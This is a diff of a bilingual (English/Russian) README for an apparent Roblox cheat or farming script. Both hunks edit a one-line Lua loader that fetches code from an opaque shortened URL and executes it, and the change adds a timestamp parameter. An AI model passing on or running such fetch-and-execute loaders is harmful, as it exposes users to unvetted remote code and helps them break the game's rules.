@@ -38,7 +38,7 @@
 4. Check **Setup Check**, then start farming.
 
 ```lua
-loadstring(game:HttpGet("https://is.gd/GUogOl"))()
+loadstring(game:HttpGet("https://is.gd/GUogOl?v=" .. tostring(os.time()), true))()
 ```
 
 *Loader compatibility depends on the execution environment. Mobile support is not verified. Solara and Xeno have not been tested.*
@@ -111,7 +111,7 @@ The item is published through the developer's Roblox account; Fit Flip belongs t
 4. Убедитесь, что **Setup Check** не показывает ошибок, и запускайте фарм.
 
 ```lua
-loadstring(game:HttpGet("https://is.gd/GUogOl"))()
+loadstring(game:HttpGet("https://is.gd/GUogOl?v=" .. tostring(os.time()), true))()
 ```
 
 *Работа загрузчика зависит от среды исполнения. Мобильная версия не проверена. Solara и Xeno не тестировались.*
